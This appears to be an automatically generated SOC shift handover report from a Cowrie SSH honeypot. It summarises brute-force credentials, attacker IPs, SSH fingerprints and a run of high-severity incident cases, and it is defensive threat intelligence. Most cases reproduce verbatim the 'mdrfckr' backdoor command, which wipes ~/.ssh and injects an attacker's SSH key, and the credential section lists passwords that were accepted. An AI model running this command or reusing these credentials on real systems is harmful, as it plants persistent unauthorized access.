# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-10 |
| **Generated At** | 2026-04-10T05:57:35Z |
| **Shift Time** | 05:57 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **125** |
| Confirmed Threats | **123** |
| False Positives Filtered | **2** (1.6%) |
| Unique Attacker IPs | **17** |
| Countries of Origin | **8** |
| High Severity Cases | **41** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **84** |
| Malware Samples Analyzed | **0** HIGH · **15** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **77** |
| Unique Credential Pairs | **39** |
| Unique Usernames | **18** |
| Unique Passwords | **39** |
| Successful Auth Pairs | **24** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 41 |
| `345gs5662d34` | 19 |
| `ali` | 2 |
| `jirka` | 1 |
| `teamspeak` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 20 |
| `345gs5662d34` | 19 |
| `5tgb%TGB` | 2 |
| `jirka` | 1 |
| `Teamspeak!@#$` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 20 |
| `345gs5662d34` | `345gs5662d34` | 19 |
| `root` | `5tgb%TGB` | 2 |
| `jirka` | `jirka` | 1 |
| `teamspeak` | `Teamspeak!@#$` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `5tgb%TGB` | `76.79.213.69` | 2026-04-10T05:01:38 |
| `root` | `3245gs5662d34` | `76.79.213.69` | 2026-04-10T05:01:45 |
| `root` | `ZAQ!2wsx2024@@` | `41.242.115.84` | 2026-04-10T05:05:05 |
| `root` | `3245gs5662d34` | `41.242.115.84` | 2026-04-10T05:05:11 |
| `root` | `King1234` | `41.242.115.84` | 2026-04-10T05:06:58 |
| `root` | `Mm123456.` | `50.35.168.148` | 2026-04-10T05:07:35 |
| `root` | `3245gs5662d34` | `50.35.168.148` | 2026-04-10T05:08:00 |
| `root` | `Ds123456` | `41.242.115.84` | 2026-04-10T05:08:51 |
| `root` | `1QAZ@2wsx` | `41.242.115.84` | 2026-04-10T05:10:47 |
| `root` | `Pass123$` | `41.242.115.84` | 2026-04-10T05:12:32 |
| `root` | `AAzz123123` | `41.242.115.84` | 2026-04-10T05:14:18 |
| `root` | `QWER@@` | `41.242.115.84` | 2026-04-10T05:16:07 |
| `root` | `Root08` | `50.35.168.148` | 2026-04-10T05:21:44 |
| `root` | `Hh123456@` | `41.242.115.84` | 2026-04-10T05:23:35 |
| `root` | `root54321!@` | `50.35.168.148` | 2026-04-10T05:25:12 |
| `root` | `336699` | `41.242.115.84` | 2026-04-10T05:27:09 |
| `root` | `123qwe!!!` | `41.242.115.84` | 2026-04-10T05:29:00 |
| `root` | `hpinvent` | `41.242.115.84` | 2026-04-10T05:32:39 |
| `root` | `root123!@#` | `41.242.115.84` | 2026-04-10T05:36:23 |
| `root` | `interser123` | `41.242.115.84` | 2026-04-10T05:40:04 |
| `root` | `qazwsxedc#$` | `41.242.115.84` | 2026-04-10T05:41:53 |
| `root` | `5tgb%TGB` | `50.35.168.148` | 2026-04-10T05:43:01 |
| `root` | `1qaz@WSX3edc$RFV` | `41.242.115.84` | 2026-04-10T05:45:30 |
| `root` | `ubuntu` | `213.215.209.101` | 2026-04-10T05:45:47 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **125** |
| Sessions with Fingerprint | **4** |
| Unique HASSH Fingerprints | **4** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 81 |
| Unknown | 5 |
| Go SSH scanner | 3 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 81 | 3 |
| `084386fa7ae5...` | Mirai/variant | 2 | 2 |
| `98ddc5604ef6...` | Modern SSH client | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 81 | 3 | Modern SSH client |
| `95420f9d932d...` | Unknown | 5 | 2 | — |
| `084386fa7ae5...` | Go SSH scanner | 2 | 2 | Mirai/variant |
| `98ddc5604ef6...` | Go SSH scanner | 1 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 19 | 3 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `76.79.213.69`, `50.35.168.148`, `41.242.115.84`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **17** |
| Unique ASNs | **15** |
| High-Risk ASNs | **14** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS63949` | Akamai Connected Cloud | 2 | HIGH |
| `AS8220` | COLT Technology Services Group Limited | 1 | HIGH |
| `AS142002` | Scloud Pte Ltd | 1 | HIGH |
| `AS9541` | Cyber Internet Services (Pvt) Ltd. | 1 | HIGH |
| `AS136180` | Beijing Tiantexin Tech. Co., Ltd. | 1 | HIGH |
| `AS37963` | Hangzhou Alibaba Advertising Co.,Ltd. | 1 | HIGH |
| `AS37613` | DOLPHIN TELECOMMUNICATION LIMITED | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (41)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-d26510f92ed0

| Field | Detail |
|---|---|
| **Source IP** | `76.79.213[.]69` |
| **First Seen** | 2026-04-10 05:01 |
| **Last Seen** | 2026-04-10 05:01 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 05:01:37` | `cowrie.session.connect` |
| `2026-04-10 05:01:37` | `cowrie.client.version` |
| `2026-04-10 05:01:37` | `cowrie.client.kex` |
| `2026-04-10 05:01:38` | `cowrie.login.success` |
| `2026-04-10 05:01:39` | `cowrie.session.params` |
| `2026-04-10 05:01:39` | `cowrie.command.input` |
| `2026-04-10 05:01:39` | `cowrie.command.failed` |
| `2026-04-10 05:01:39` | `cowrie.log.closed` |
| `2026-04-10 05:01:40` | `cowrie.session.params` |
| `2026-04-10 05:01:40` | `cowrie.command.input` |
| `2026-04-10 05:01:40` | `cowrie.session.file_download` |
| `2026-04-10 05:01:40` | `cowrie.log.closed` |
| `2026-04-10 05:01:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `76.79.213[.]69` to AbuseIPDB if not already reported
- [ ] Block `76.79.213[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-139654de99b7

| Field | Detail |
|---|---|
| **Source IP** | `76.79.213[.]69` |
| **First Seen** | 2026-04-10 05:01 |
| **Last Seen** | 2026-04-10 05:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 05:01:44` | `cowrie.session.connect` |
| `2026-04-10 05:01:44` | `cowrie.client.version` |
| `2026-04-10 05:01:44` | `cowrie.client.kex` |
| `2026-04-10 05:01:45` | `cowrie.login.success` |
| `2026-04-10 05:01:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `76.79.213[.]69` to AbuseIPDB if not already reported
- [ ] Block `76.79.213[.]69` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd6248b6787b

| Field | Detail |
|---|---|
| **Source IP** | `41.242.115[.]84` |
| **First Seen** | 2026-04-10 05:05 |
| **Last Seen** | 2026-04-10 05:05 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 05:05:04` | `cowrie.session.connect` |
| `2026-04-10 05:05:04` | `cowrie.client.version` |
| `2026-04-10 05:05:04` | `cowrie.client.kex` |
| `2026-04-10 05:05:05` | `cowrie.login.success` |
| `2026-04-10 05:05:06` | `cowrie.session.params` |
| `2026-04-10 05:05:06` | `cowrie.command.input` |
| `2026-04-10 05:05:06` | `cowrie.command.failed` |
| `2026-04-10 05:05:06` | `cowrie.log.closed` |
| `2026-04-10 05:05:07` | `cowrie.session.params` |
| `2026-04-10 05:05:07` | `cowrie.command.input` |
| `2026-04-10 05:05:07` | `cowrie.session.file_download` |
| `2026-04-10 05:05:07` | `cowrie.log.closed` |
| `2026-04-10 05:05:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.242.115[.]84` to AbuseIPDB if not already reported
- [ ] Block `41.242.115[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac719feb182f

| Field | Detail |
|---|---|
| **Source IP** | `41.242.115[.]84` |
| **First Seen** | 2026-04-10 05:05 |
| **Last Seen** | 2026-04-10 05:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 05:05:10` | `cowrie.session.connect` |
| `2026-04-10 05:05:10` | `cowrie.client.version` |
| `2026-04-10 05:05:10` | `cowrie.client.kex` |
| `2026-04-10 05:05:11` | `cowrie.login.success` |
| `2026-04-10 05:05:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.242.115[.]84` to AbuseIPDB if not already reported
- [ ] Block `41.242.115[.]84` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76bc5ce679b3

| Field | Detail |
|---|---|
| **Source IP** | `41.242.115[.]84` |
| **First Seen** | 2026-04-10 05:06 |
| **Last Seen** | 2026-04-10 05:07 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 05:06:56` | `cowrie.session.connect` |
| `2026-04-10 05:06:56` | `cowrie.client.version` |
| `2026-04-10 05:06:57` | `cowrie.client.kex` |
| `2026-04-10 05:06:58` | `cowrie.login.success` |
| `2026-04-10 05:06:58` | `cowrie.session.params` |
| `2026-04-10 05:06:58` | `cowrie.command.input` |
| `2026-04-10 05:06:58` | `cowrie.command.failed` |
| `2026-04-10 05:06:59` | `cowrie.log.closed` |
| `2026-04-10 05:06:59` | `cowrie.session.params` |
| `2026-04-10 05:06:59` | `cowrie.command.input` |
| `2026-04-10 05:06:59` | `cowrie.session.file_download` |
| `2026-04-10 05:06:59` | `cowrie.log.closed` |
| `2026-04-10 05:07:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.242.115[.]84` to AbuseIPDB if not already reported
- [ ] Block `41.242.115[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a540c6c5b55

| Field | Detail |
|---|---|
| **Source IP** | `41.242.115[.]84` |
| **First Seen** | 2026-04-10 05:07 |
| **Last Seen** | 2026-04-10 05:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 05:07:02` | `cowrie.session.connect` |
| `2026-04-10 05:07:02` | `cowrie.client.version` |
| `2026-04-10 05:07:03` | `cowrie.client.kex` |
| `2026-04-10 05:07:04` | `cowrie.login.success` |
| `2026-04-10 05:07:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.242.115[.]84` to AbuseIPDB if not already reported
- [ ] Block `41.242.115[.]84` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7d8dbac32e7

| Field | Detail |
|---|---|
| **Source IP** | `50.35.168[.]148` |
| **First Seen** | 2026-04-10 05:07 |
| **Last Seen** | 2026-04-10 05:08 |
| **Session Duration** | 29s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 05:07:32` | `cowrie.session.connect` |
| `2026-04-10 05:07:32` | `cowrie.client.version` |
| `2026-04-10 05:07:32` | `cowrie.client.kex` |
| `2026-04-10 05:07:35` | `cowrie.login.success` |
| `2026-04-10 05:07:36` | `cowrie.session.params` |
| `2026-04-10 05:07:36` | `cowrie.command.input` |
| `2026-04-10 05:07:36` | `cowrie.command.failed` |
| `2026-04-10 05:07:37` | `cowrie.log.closed` |
| `2026-04-10 05:07:42` | `cowrie.session.params` |
| `2026-04-10 05:07:42` | `cowrie.command.input` |
| `2026-04-10 05:07:43` | `cowrie.session.file_download` |
| `2026-04-10 05:07:43` | `cowrie.log.closed` |
| `2026-04-10 05:08:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.35.168[.]148` to AbuseIPDB if not already reported
- [ ] Block `50.35.168[.]148` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69f6dc273091

| Field | Detail |
|---|---|
| **Source IP** | `50.35.168[.]148` |
| **First Seen** | 2026-04-10 05:07 |
| **Last Seen** | 2026-04-10 05:08 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 05:07:54` | `cowrie.session.connect` |
| `2026-04-10 05:07:57` | `cowrie.client.version` |
| `2026-04-10 05:07:57` | `cowrie.client.kex` |
| `2026-04-10 05:08:00` | `cowrie.login.success` |
| `2026-04-10 05:08:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.35.168[.]148` to AbuseIPDB if not already reported
- [ ] Block `50.35.168[.]148` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc2e1cc19652

| Field | Detail |
|---|---|
| **Source IP** | `41.242.115[.]84` |
| **First Seen** | 2026-04-10 05:08 |
| **Last Seen** | 2026-04-10 05:08 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 05:08:50` | `cowrie.session.connect` |
| `2026-04-10 05:08:50` | `cowrie.client.version` |
| `2026-04-10 05:08:50` | `cowrie.client.kex` |
| `2026-04-10 05:08:51` | `cowrie.login.success` |
| `2026-04-10 05:08:52` | `cowrie.session.params` |
| `2026-04-10 05:08:52` | `cowrie.command.input` |
| `2026-04-10 05:08:52` | `cowrie.command.failed` |
| `2026-04-10 05:08:52` | `cowrie.log.closed` |
| `2026-04-10 05:08:52` | `cowrie.session.params` |
| `2026-04-10 05:08:52` | `cowrie.command.input` |
| `2026-04-10 05:08:53` | `cowrie.session.file_download` |
| `2026-04-10 05:08:53` | `cowrie.log.closed` |
| `2026-04-10 05:08:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.242.115[.]84` to AbuseIPDB if not already reported
- [ ] Block `41.242.115[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50f931d3503c

| Field | Detail |
|---|---|
| **Source IP** | `41.242.115[.]84` |
| **First Seen** | 2026-04-10 05:08 |
| **Last Seen** | 2026-04-10 05:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 05:08:56` | `cowrie.session.connect` |
| `2026-04-10 05:08:56` | `cowrie.client.version` |
| `2026-04-10 05:08:56` | `cowrie.client.kex` |
| `2026-04-10 05:08:57` | `cowrie.login.success` |
| `2026-04-10 05:08:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.242.115[.]84` to AbuseIPDB if not already reported
- [ ] Block `41.242.115[.]84` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58b90046e3c8

| Field | Detail |
|---|---|
| **Source IP** | `41.242.115[.]84` |
| **First Seen** | 2026-04-10 05:10 |
| **Last Seen** | 2026-04-10 05:10 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 05:10:46` | `cowrie.session.connect` |
| `2026-04-10 05:10:46` | `cowrie.client.version` |
| `2026-04-10 05:10:46` | `cowrie.client.kex` |
| `2026-04-10 05:10:47` | `cowrie.login.success` |
| `2026-04-10 05:10:48` | `cowrie.session.params` |
| `2026-04-10 05:10:48` | `cowrie.command.input` |
| `2026-04-10 05:10:48` | `cowrie.command.failed` |
| `2026-04-10 05:10:48` | `cowrie.log.closed` |
| `2026-04-10 05:10:49` | `cowrie.session.params` |
| `2026-04-10 05:10:49` | `cowrie.command.input` |
| `2026-04-10 05:10:49` | `cowrie.session.file_download` |
| `2026-04-10 05:10:49` | `cowrie.log.closed` |
| `2026-04-10 05:10:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.242.115[.]84` to AbuseIPDB if not already reported
- [ ] Block `41.242.115[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce2503d1cc0d

| Field | Detail |
|---|---|
| **Source IP** | `41.242.115[.]84` |
| **First Seen** | 2026-04-10 05:10 |
| **Last Seen** | 2026-04-10 05:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 05:10:52` | `cowrie.session.connect` |
| `2026-04-10 05:10:52` | `cowrie.client.version` |
| `2026-04-10 05:10:52` | `cowrie.client.kex` |
| `2026-04-10 05:10:53` | `cowrie.login.success` |
| `2026-04-10 05:10:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.242.115[.]84` to AbuseIPDB if not already reported
- [ ] Block `41.242.115[.]84` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de8625fa43f1

| Field | Detail |
|---|---|
| **Source IP** | `41.242.115[.]84` |
| **First Seen** | 2026-04-10 05:12 |
| **Last Seen** | 2026-04-10 05:12 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

